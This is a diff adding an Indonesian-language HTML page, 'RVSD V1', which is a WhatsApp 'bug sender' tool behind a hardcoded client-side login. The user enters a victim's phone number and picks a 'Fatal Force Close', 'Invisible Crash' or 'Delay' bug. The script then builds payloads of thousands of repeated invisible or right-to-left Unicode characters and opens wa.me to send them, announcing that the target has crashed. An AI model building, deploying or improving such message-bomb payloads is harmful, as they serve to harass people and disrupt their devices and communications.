@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>RVSD V1</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap');
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Orbitron',sans-serif;}
+    body{background:#000;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;background:radial-gradient(circle at center,#1a0033,#000);}
+    .glow{border:2px solid #ff00ff;border-radius:18px;box-shadow:0 0 25px #ff00ff, inset 0 0 15px #ff00ff;}
+    .login,.menu{display:none;flex-direction:column;align-items:center;width:92%;max-width:420px;}
+    .login.active,.menu.active{display:flex;}
+    .logo{width:135px;height:135px;border-radius:50%;background:url('https://i.ibb.co.com/YourNewIconHere') center/cover;border:5px solid #ff00ff;box-shadow:0 0 50px #ff00ff;margin-bottom:20px;animation:pulse 2.5s infinite;}
+    @keyframes pulse{0%,100%{box-shadow:0 0 50px #ff00ff}50%{box-shadow:0 0 70px #ff33ff, 0 0 90px #ff00ff}}
+    .avatar{width:100px;height:100px;border-radius:50%;background:url('https://i.ibb.co.com/YourNewIconHere') center/cover;border:5px solid #ff00ff;box-shadow:0 0 35px #ff00ff;}
+    h1{font-size:2.9em;color:#ff00ff;text-shadow:0 0 18px #ff00ff;letter-spacing:3px;}
+    p{font-size:1.1em;margin:14px 0;color:#ddd;}
+    input,select{width:100%;padding:19px;margin:13px 0;background:#111;border:2px solid #ff00ff;border-radius:15px;color:#fff;font-size:1.15em;outline:none;}
+    input::placeholder{color:#ff00ff;opacity:0.85;}
+    button{width:100%;padding:22px;margin:28px 0;background:linear-gradient(45deg,#ff00ff,#cc00ff);border:none;border-radius:50px;color:#fff;font-size:1.5em;font-weight:700;cursor:pointer;box-shadow:0 0 35px #ff00ff;transition:0.4s;}
+    button:hover{transform:scale(1.07);box-shadow:0 0 60px #ff00ff;background:linear-gradient(45deg,#ff33ff,#ff0066);}
+    .card{background:rgba(30,0,60,0.92);padding:28px;border-radius:20px;text-align:center;margin-bottom:32px;width:100%;backdrop-filter:blur(6px);}
+    .toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%);background:#ff0066;padding:18px 38px;border-radius:50px;box-shadow:0 0 30px #ff0066;z-index:9999;font-weight:700;animation:pop 0.5s;display:none;}
+    @keyframes pop{0%{opacity:0;transform:translateX(-50%) translateY(30px)}100%{opacity:1;transform:translateX(-50%) translateY(0)}}
+  </style>
+</head>
+<body>
+
+  <!-- LOGIN -->
+  <div id="login" class="login glow">
+    <div class="logo"></div>
+    <h1>Welcome Back</h1>
+    <p>Login to continue</p>
+    <input type="text" id="user" placeholder="Username" autocomplete="off"/>
+    <input type="password" id="pass" placeholder="Password" autocomplete="off"/>
+    <button onclick="login()">LOGIN</button>
+  </div>
+
+  <!-- MENU UTAMA -->
+  <div id="menu" class="menu">
+    <div class="card glow">
+      <div class="avatar"></div>
+      <h2 style="margin:20px 0;color:#ff00ff;font-size:2em;">permenmd</h2>
+      <p>Role: <b style="color:#ff00ff;">Developer</b> • Exp: <b style="color:#ff00ff;">9999999-09-99</b></p>
+    </div>
+
+    <div class="card glow">
+      <h2 style="color:#ff00ff;margin-bottom:15px;">Target Number</h2>
+      <input type="text" id="nomor" placeholder="6285211519578" />
+      
+      <h2 style="color:#ff00ff;margin:25px 0 12px;">Select Bug</h2>
+      <select id="bug">
+        <option value="">Pilih Bug Dulu</option>
+        <option value="force">Fatal Force Close</option>
+        <option value="invisible">Invisible Crash</option>
+        <option value="delay">Delay 60 Detik</option>
+      </select>
+
+      <button onclick="kirimBug()">SEND BUG</button>
+    </div>
+  </div>
+
+  <div id="toast" class="toast"></div>
+
+<script>
+// GANTI LINK INI DENGAN GAMBAR KAMU!
+const ICON_URL = 'https://i.ibb.co.com/YourNewIconHere';
+
+// Cek login otomatis (localStorage)
+if(localStorage.getItem('rvsd_logged') === 'true'){
+  document.getElementById('login').style.display = 'none';
+  document.getElementById('menu').classList.add('active');
+  updateIcons();
+}
+
+function updateIcons(){
+  document.querySelectorAll('.logo, .avatar').forEach(el => {
+    el.style.backgroundImage = `url('${ICON_URL}')`;
+  });
+}
+
+function login(){
+  const u = document.getElementById('user').value.trim();
+  const p = document.getElementById('pass').value;
+  if(u === '790' && p === 'rvsdgcorparah'){
+    localStorage.setItem('rvsd_logged', 'true'); // SIMPAN SELAMANYA
+    document.getElementById('login').classList.remove('active');
+    document.getElementById('menu').classList.add('active');
+    updateIcons();
+    toast('Selamat Datang Kembali, Developer!');
+  } else {
+    toast('Username / Password SALAH!');
+  }
+}
+
+function toast(msg){
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.style.display = 'block';
+  setTimeout(() => t.style.display = 'none', 3000);
+}
+
+function kirimBug(){
+  let nomor = document.getElementById('nomor').value.trim();
+  let bug = document.getElementById('bug').value;
+
+  if(!nomor.match(/^62[0-9]+$/)){
+    toast('Nomor harus diawali 62!');
+    return;
+  }
+  if(!bug){
+    toast('Pilih Dulu Geh');
+    return;
+  }
+
+  let payload = '';
+  if(bug === 'force') payload = '‏‏‎ ‎‏‏‎ '.repeat(600) + 'RVSD FORCE CRASH';
+  if(bug === 'invisible') payload = '\u200F'.repeat(1000);
+  if(bug === 'delay') payload = '‎‏‏‎'.repeat(1500) + 'DELAY 60 DETIK';
+
+  window.open(`https://wa.me/${nomor}?text=${encodeURIComponent(payload)}`, '_blank');
+  toast('BUG TERKIRIM! Target CRASH!');
+  
+  document.getElementById('nomor').value = '';
+  document.getElementById('bug').value = '';
+}
+
+// Update icon saat halaman load
+window.onload = updateIcons;
+</script>
+
+</body>
+</html>
